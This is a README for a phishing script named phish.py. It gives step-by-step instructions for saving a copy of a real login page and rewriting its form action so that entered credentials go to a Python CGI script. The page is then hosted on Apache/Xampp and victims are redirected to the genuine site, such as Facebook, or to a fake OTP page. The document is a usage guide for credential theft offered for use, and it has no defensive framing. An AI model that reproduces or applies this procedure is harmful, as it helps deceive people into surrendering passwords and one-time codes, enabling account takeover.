# phish.py

This program will save all login information from a webpage & giving you full control
like where you want to redirect your webpage after saving credentials (Any other login or OTP page).

# Usage:

1. Download your webpage from browser by right clicking on empty space & selecting "Save Page As" or by pressing "ctrl+s".
2. Open your downloaded webpage with notepad & search for "action=".
3. Change value of "action" attribute to "phish.py". 
   Example: <form action="login.php"> to <form action="phish.py">
4. Now configure your webserver to run python CGI programs.
   (How to configure Xampp/Apache is given in Apache Configuration file.)
5. Copy your edited webpage to server directory (htdocs/www).
6. Start your server.
  
[You're done!]

# Note:
*Change the first line of program "#!C:\Python34\python" to your python installation directory.

*You can choose where you want your website to redirect by changing the value of location header.
Example: Change print("Location:https://www.facebook.com/") to print("Location:https://www.twitter.com/").

*You can also redirect your webpage to any other login or fake OTP page.

*Don't remove empty lines.
